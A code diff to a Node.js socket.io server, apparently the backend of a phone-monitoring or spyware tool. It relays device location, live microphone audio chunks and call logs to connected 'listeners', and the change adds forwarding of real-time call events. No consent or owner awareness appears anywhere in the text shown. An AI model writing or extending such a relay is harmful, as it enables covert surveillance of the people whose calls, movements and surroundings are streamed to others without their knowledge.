@@ -36,25 +36,25 @@ io.on("connection", (socket) => {
   // Forward location updates
   socket.on("location-update", (data) => {
     console.log(`📍 Location from ${socket.id}:`, data);
-    listeners.forEach((id) => {
-      io.to(id).emit("location-update", data);
-    });
+    listeners.forEach((id) => io.to(id).emit("location-update", data));
   });
 
   // Forward audio chunks
   socket.on("audio-chunk", (chunk) => {
     console.log(`🎤 Audio chunk from ${socket.id}, size: ${chunk.length}`);
-    listeners.forEach((id) => {
-      io.to(id).emit("audio-chunk", chunk);
-    });
+    listeners.forEach((id) => io.to(id).emit("audio-chunk", chunk));
   });
 
-  // Forward call logs 📞
+  // Forward periodic call logs
   socket.on("call-logs", (logs) => {
-    console.log(`📞 Call logs received from ${socket.id}, count: ${logs.length}`);
-    listeners.forEach((id) => {
-      io.to(id).emit("call-logs", logs);
-    });
+    console.log(`📋 Call logs from ${socket.id}, count: ${logs.length}`);
+    listeners.forEach((id) => io.to(id).emit("call-logs", logs));
+  });
+
+  // Forward real-time call events
+  socket.on("call-event", (event) => {
+    console.log(`📞 Call event from ${socket.id}:`, event);
+    listeners.forEach((id) => io.to(id).emit("call-event", event));
   });
 
   // Handle disconnect
@@ -68,4 +68,3 @@ io.on("connection", (socket) => {
 server.listen(PORT, () => {
   console.log(`🚀 Server listening on port ${PORT}`);
 });
-
